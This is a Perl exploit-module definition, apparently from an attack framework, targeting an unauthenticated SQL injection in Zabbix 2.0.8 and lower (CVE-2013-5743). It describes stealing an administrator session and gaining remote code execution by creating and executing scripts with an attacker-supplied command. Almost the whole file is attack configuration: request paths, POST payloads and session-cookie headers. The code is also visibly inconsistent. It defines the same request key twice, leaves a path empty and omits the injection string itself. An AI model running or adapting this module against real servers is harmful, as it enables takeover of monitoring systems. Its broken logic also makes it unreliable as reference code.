package ZABBIX::MSF::ZabbixSqli;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "ZabbixSqli";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-5743",
  DESCRIPTION => "

        This module exploits an unauthenticated SQL injection vulnerability affecting Zabbix

        versions 2.0.8 and lower.  The SQL injection issue can be abused in order to retrieve an

        active session ID.  If an administrator level user is identified, remote code execution

        can be gained by uploading and executing remote scripts via the 'scripts_exec.php' file.

      ",
  METHOD => "POST",
  MSF_MODULE => "zabbix_sqli",
  PATH => "applications=__APPLICATIONS__&execute=__EXECUTE__&scriptid=__SCRIPTID__&sid=__SID__&hostid=10084&",
  PATHS => ["zabbix"],
  PAYLOAD => "sid=__SID__&form=Create+script&name=__NAME__&type=0&execute_on=1&command=__COMMAND__&commandipmi=&description=&usrgrpid=0&groupid=0&access=2&save=Save&",
  REFERENCES => ["https://support.zabbix.com/browse/ZBX-7091"],
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The URI of the vulnerable Zabbix instance",
  VALUE => "/zabbix",
},
    'SCRIPTID' =>       { DESCRIPTION => "", VALUE => "" },
    'SID' =>       { DESCRIPTION => "", VALUE => "" },
    'COMMAND' =>       { DESCRIPTION => "", VALUE => "" },
    'NAME' =>       { DESCRIPTION => "", VALUE => "" },
    'URI' =>       { DESCRIPTION => "", VALUE => "" },
    'EXECUTE' =>       { DESCRIPTION => "", VALUE => "" },
    'APPLICATIONS' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'scripts.php',
      PAYLOAD      => 'sid=&form_refresh=1&scripts[]=&go=delete&goButton=Go (1)',
      TEXT   => 'Sending Exploit #1 Request : [POST] /scripts.php',
      HEADERS      => {
        'Cookie' => 'zbx_sessionid=',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
